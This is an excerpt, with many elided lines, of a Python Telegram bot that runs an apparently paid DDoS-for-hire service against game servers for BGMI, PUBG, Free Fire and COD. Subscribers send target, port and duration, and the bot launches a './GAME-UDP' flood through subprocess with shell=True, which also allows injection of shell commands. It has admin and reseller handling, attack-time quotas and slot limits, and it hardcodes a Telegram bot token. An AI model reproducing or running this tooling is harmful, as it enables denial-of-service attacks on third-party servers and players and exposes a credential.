...
TOKEN = '7189735311:AAEHG-lmCFjMiT3SXPR0Qo2sGzbQZqOvolE'
...
# Admin usernames
admin_usernames = ["o_404_error_o", "Crypticxsoulxxx"]
        ...
        if username in user_plans:
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟏𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
                    ...
                    elif count_ongoing_attacks() >= 2:
                        response = "[𝐁𝐆𝐌𝐈] 𝐀𝐥𝐥 5 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐏𝐔𝐁𝐆] 𝐀𝐥𝐥 5 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐅𝐑𝐄𝐄𝐅𝐈𝐑𝐄] 𝐀𝐥𝐥 5 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐂𝐎𝐃] 𝐀𝐥𝐥 5 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
    ...
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        ...
        if all_user_info:
            for username, user_info in all_user_info.items():
                end_date, attacks, cooldown = user_info
                response += f"𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}, 𝐄𝐧𝐝 𝐃𝐚𝐭𝐞: {end_date}, 𝐓𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞: {attacks}, 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n"
        else:
...
def display_help(message):
    response = "[𝐕𝐈𝐏 𝐔𝐒𝐄𝐑𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃]👇👇👇👇\n"
    response += "\n"
    response += "/bgmi      (𝐦𝐚𝐱 𝟏𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/pubg      (𝐦𝐚𝐱 𝟏𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/freefire  (𝐦𝐚𝐱 𝟏𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/cod         (𝐦𝐚𝐱 𝟏𝟎𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def display_help(message):
    response = "𝐀𝐃𝐌𝐈𝐍 :- @o_404_error_o\n"
    response += "\n"
